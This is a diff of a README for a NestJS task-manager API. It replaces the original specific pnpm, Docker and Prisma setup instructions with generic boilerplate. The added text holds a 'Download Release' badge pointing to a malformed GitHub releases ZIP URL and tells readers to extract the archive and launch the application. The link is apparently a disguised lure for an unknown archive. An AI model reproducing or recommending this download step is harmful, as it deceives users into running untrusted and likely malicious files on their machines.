@@ -1,116 +1,70 @@
-<p align="center">
-  <a href="http://nestjs.com/" target="blank"><img src="https://nestjs.com/img/logo-small.svg" width="200" alt="Nest Logo" /></a>
-</p>
+# Task Manager API 🚀
 
-[circleci-image]: https://img.shields.io/circleci/build/github/nestjs/nest/master?token=abc123def456
-[circleci-url]: https://circleci.com/gh/nestjs/nest
+Welcome to the Task Manager API repository! This API serves as the backend for a task management application, built with a focus on clean architecture and domain-driven design (DDD). It utilizes popular technologies such as Express, NestJS, Node.js, PostgreSQL, Prisma ORM, SuperTest, TypeScript, Vite, and Zod.
 
-  <p align="center">A progressive <a href="http://nodejs.org" target="_blank">Node.js</a> framework for building efficient and scalable server-side applications.</p>
-    <p align="center">
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/v/@nestjs/core.svg" alt="NPM Version" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/l/@nestjs/core.svg" alt="Package License" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/dm/@nestjs/common.svg" alt="NPM Downloads" /></a>
-<a href="https://circleci.com/gh/nestjs/nest" target="_blank"><img src="https://img.shields.io/circleci/build/github/nestjs/nest/master" alt="CircleCI" /></a>
-<a href="https://coveralls.io/github/nestjs/nest?branch=master" target="_blank"><img src="https://coveralls.io/repos/github/nestjs/nest/badge.svg?branch=master#9" alt="Coverage" /></a>
-<a href="https://discord.gg/G7Qnnhy" target="_blank"><img src="https://img.shields.io/badge/discord-online-brightgreen.svg" alt="Discord"/></a>
-<a href="https://opencollective.com/nest#backer" target="_blank"><img src="https://opencollective.com/nest/backers/badge.svg" alt="Backers on Open Collective" /></a>
-<a href="https://opencollective.com/nest#sponsor" target="_blank"><img src="https://opencollective.com/nest/sponsors/badge.svg" alt="Sponsors on Open Collective" /></a>
-  <a href="https://paypal.me/kamilmysliwiec" target="_blank"><img src="https://img.shields.io/badge/Donate-PayPal-ff3f59.svg"/></a>
-    <a href="https://opencollective.com/nest#sponsor"  target="_blank"><img src="https://img.shields.io/badge/Support%20us-Open%20Collective-41B883.svg" alt="Support us"></a>
-  <a href="https://twitter.com/nestframework" target="_blank"><img src="https://img.shields.io/twitter/follow/nestframework.svg?style=social&label=Follow"></a>
-</p>
-  <!--[![Backers on Open Collective](https://opencollective.com/nest/backers/badge.svg)](https://opencollective.com/nest#backer)
-  [![Sponsors on Open Collective](https://opencollective.com/nest/sponsors/badge.svg)](https://opencollective.com/nest#sponsor)-->
+## Overview ℹ️
 
-## Description
+This repository contains the source code for the Task Manager API. The API is designed to efficiently manage tasks and provide essential functionalities for task tracking and organization. Whether you are building a personal task manager or integrating task management features into a larger application, this API has you covered.
 
-API for task management application.
+## Features ✨
 
-## Features
+- **Clean Architecture:** Built following best practices for clean architecture to ensure separation of concerns and maintainability.
+- **Domain-Driven Design (DDD):** Utilizes DDD principles to model the domain logic effectively.
+- **Express:** Utilizes Express.js as the web application framework for Node.js.
+- **NestJS:** Employs NestJS, a progressive Node.js framework, for building efficient, reliable, and scalable server-side applications.
+- **PostgreSQL:** Uses PostgreSQL as the relational database management system.
+- **Prisma ORM:** Integrates Prisma ORM for database access and data modeling.
+- **SuperTest:** Implements SuperTest for HTTP assertions to test Express routes.
+- **TypeScript:** Written in TypeScript for improved code quality and maintainability.
+- **Vite:** Utilizes Vite for fast and efficient web development tooling.
+- **Zod:** Integrates Zod for runtime type checking for improved reliability.
 
-### User Management:  
-  - [x] Create User  
-  - [x] Authenticate User  
-  - [x] Get User by ID  
-  - [x] Update User  
-  - [x] Delete User  
+## Installation and Usage 🛠️
 
-### Task Management:  
-  - [x] Create Task  
-  - [x] Get Task by ID  
-  - [x] Fetch Tasks with Pagination, Filtering by Status, and Search  
-  - [x] Update Task  
-  - [x] Update Task Status  
-  - [x] Delete Task  
+To get started with the Task Manager API, follow these steps:
 
-### Health Check:  
-  - [x] Check Database Connection
+1. Clone the repository: `git clone https://github.com/username/task-manager-api.git`
+2. Install dependencies: `npm install`
+3. Set up the PostgreSQL database and update the database configuration in the `.env` file.
+4. Run the migrations: `npx prisma migrate dev`
+5. Start the server: `npm run start`
 
-### Security:  
-  - [x] JWT Authentication  
-  - [x] Rate Limiting  
+## API Endpoints 🛤️
 
-## Installation
+The API exposes the following endpoints for managing tasks:
 
-```bash
-$ pnpm install
-```
+- `GET /tasks`: Retrieve all tasks.
+- `GET /tasks/:id`: Retrieve a specific task.
+- `POST /tasks`: Create a new task.
+- `PUT /tasks/:id`: Update an existing task.
+- `DELETE /tasks/:id`: Delete a task.
 
-## Environment Variables
+Refer to the API documentation or source code for more detailed information on the available endpoints and request/response formats.
 
-```bash
-cp .env.example .env
-```
+## Testing 🧪
 
-## Create database
-```bash
-$ docker compose up -d
-```
+The Task Manager API includes comprehensive test coverage to ensure the reliability and correctness of the API endpoints. SuperTest is used for writing integration tests that validate the functionality of the API across various scenarios. To run tests, execute: `npm run test`.
 
-## Generate Prisma Client
+## Deployment 🚀
 
-```bash
-$ pnpm run db:generate
-```
+To deploy the Task Manager API to a production environment, consider configuring continuous integration/continuous deployment (CI/CD) pipelines using tools like GitHub Actions, GitLab CI/CD, or Jenkins. Ensure that the necessary environment variables are set, and the database connection is appropriately configured for the production environment.
 
-## Run Database Migrations
+## Download Release 📦
 
-```bash
-# development
-$ pnpm run db:migrate
+Download the latest release of the Task Manager API codebase by clicking the button below:
 
-# production
-$ pnpm run db:deploy
-```
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
 
-## Run Prisma Seed
+If the link ends with the file name, ensure to extract the ZIP file and launch the application as per the installation instructions provided.
 
-```bash
-$ pnpm run db:seed
-```
+## Contributing 🤝
 
-## Running the app
+If you'd like to contribute to the development of the Task Manager API, feel free to submit pull requests or open issues on the GitHub repository. You can also contribute by improving the test coverage, enhancing the API documentation, or adding new features to enhance the functionality of the API.
 
-```bash
-# development
-$ pnpm run start
+## License 📝
 
-# watch mode
-$ pnpm run start:dev
+The Task Manager API is open-source software licensed under the MIT license. Feel free to use, modify, and distribute the code as per the terms of the license.
 
-# production mode
-$ pnpm run start:prod
-```
+---
 
-## Test
-
-```bash
-# unit tests
-$ pnpm run test
-
-# e2e tests
-$ pnpm run test:e2e
-
-# test coverage
-$ pnpm run test:cov
-```
+Thank you for checking out the Task Manager API repository! Happy coding! 🎉
